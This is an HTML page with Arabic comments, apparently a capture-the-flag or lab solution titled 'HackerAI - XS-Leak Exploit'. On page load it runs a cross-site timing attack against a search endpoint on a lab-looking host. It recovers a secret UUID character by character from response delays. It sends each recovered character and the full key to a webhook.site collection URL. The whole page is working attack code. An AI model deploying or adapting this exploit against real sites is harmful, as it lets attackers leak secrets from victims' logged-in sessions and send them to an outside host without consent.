<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>HackerAI - XS-Leak Exploit</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #00ff00; padding: 20px; }
        .container { border: 1px solid #333; padding: 20px; border-radius: 8px; background-color: #222; }
        #key-display { font-size: 24px; color: #ff00ff; word-break: break-all; margin: 10px 0; }
        .status { color: #aaa; }
        .log { background: #000; padding: 10px; height: 300px; overflow-y: scroll; font-size: 12px; border: 1px solid #444; margin-top: 10px; }
    </style>
</head>
<body>

<div class="container">
    <h1>XS-Leak Timing Attack (UUID)</h1>
    <p class="status">الحالة: <span id="status">جاهز للبدء...</span></p>
    <div>المفتاح المستخرج حالياً:</div>
    <div id="key-display">جاري البدء...</div>
    
    <div class="log" id="log"></div>
</div>

<script>
    const TARGET_BASE = "http://ptl-41f731a5e034-c2c22805e34a.libcurl.me/search?search=";
    const WEBHOOK_URL = "https://webhook.site/2a326388-6705-466d-9454-bd91d189b738";
    const CHARSET = "0123456789-abcdef";
    const THRESHOLD = 3000; // الحد الفاصل الذي طلبته (3 ثوانٍ)
    
    let leakedKey = "";
    const logElement = document.getElementById('log');

    function log(msg) {
        const div = document.createElement('div');
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logElement.appendChild(div);
        logElement.scrollTop = logElement.scrollHeight;
    }

    async function checkChar(testKey) {
        // نستخدم caret (^) للتأكد من مطابقة بداية السلسلة
        const url = `${TARGET_BASE}${testKey}^&cb=${Math.random()}`;
        const start = performance.now();
        
        try {
            // استخدام fetch مع no-cors لتجنب مشاكل السياسات الأمنية للمتصفح
            await fetch(url, { mode: 'no-cors', cache: 'no-cache' });
        } catch (e) {
            // الخطأ متوقع بسبب CORS ولكن التوقيت لا يتأثر
        }
        
        return performance.now() - start;
    }

    async function startExploit() {
        log("بدء الهجوم على النطاق المستهدف...");
        document.getElementById("status").innerText = "جاري الاستخراج...";

        // طول الـ UUID هو 36 حرفاً (بما في ذلك الشرطات)
        for (let i = 0; i < 36; i++) {
            let foundInThisRound = false;

            // إذا كان الحرف الحالي هو موضع شرطة في UUID (اختياري للتحسين)
            // if (i === 8 || i === 13 || i === 18 || i === 23) { ... }

            for (let char of CHARSET) {
                const currentTry = leakedKey + char;
                log(`تجربة: ${currentTry}...`);
                
                const duration = await checkChar(currentTry);
                log(`الوقت المستغرق: ${duration.toFixed(2)}ms`);

                if (duration >= THRESHOLD) {
                    leakedKey += char;
                    document.getElementById("key-display").innerText = leakedKey;
                    log(`*** تم العثور على حرف: ${char} ***`);
                    
                    // إرسال الحرف المكتشف إلى الـ Webhook الخاص بك
                    fetch(`${WEBHOOK_URL}?found=${leakedKey}&duration=${duration.toFixed(2)}`);
                    
                    foundInThisRound = true;
                    break; // انتقل للحرف التالي في الـ UUID
                }
            }

            if (!foundInThisRound) {
                log("لم يتم العثور على مطابقة في هذه الدورة، قد يكون هناك خلل في التوقيت.");
                // يمكن إضافة منطق لإعادة المحاولة هنا إذا لزم الأمر
            }
        }

        log("انتهى الهجوم. المفتاح الكامل: " + leakedKey);
        document.getElementById("status").innerText = "اكتمل الهجوم!";
        fetch(`${WEBHOOK_URL}?final_key=${leakedKey}`);
    }

    // تأخير البدء لثانية واحدة لضمان استقرار المتصفح
    setTimeout(startExploit, 1000);
</script>

</body>
</html>
